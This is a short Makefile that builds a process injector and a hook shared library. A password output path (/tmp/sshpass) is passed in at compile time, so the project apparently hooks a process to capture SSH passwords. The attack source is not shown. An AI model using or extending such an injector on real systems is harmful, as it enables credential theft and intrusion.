all: main inject  hook 
	
GXXFLAG=-std=c++17
PASSWDPATH=/tmp/sshpass
LIBCNAME=$(shell echo `cat /proc/self/maps|grep libc|head -n1|cut -d '/' -f4`)
LIBNAME=$(shell echo  `pwd`/debug/hook.so)


main: src/inject.cpp
	g++ $(GXXFLAG) src/inject.cpp -g -DPASSWDPATH=\"$(PASSWDPATH)\"  -D LIBNAME=\"$(LIBNAME)\" -D LIBCNAME=\"$(LIBCNAME)\" -ldl -o debug/main
inject: src/test.cpp
	g++ $(GXXFLAG) src/test.cpp -g -DPASSWDPATH=\"$(PASSWDPATH)\" -DLIBNAME=\"$(LIBNAME)\" -DLIBCNAME=\"$(LIBCNAME)\" -ldl -o debug/inject
hook: ./Hook.c
	g++ $(GXXFLAG) ./Hook.c -D HOOK -DPASSWDPATH=\"$(PASSWDPATH)\" -DLIBNAME=\"$(LIBNAME)\" -DLIBCNAME=\"$(LIBCNAME)\" -g -O0 -Wl,-z,relro,-z,now -fno-stack-protector -ldl -shared -o debug/hook.so -fPIC
clean:
	rm debug/*
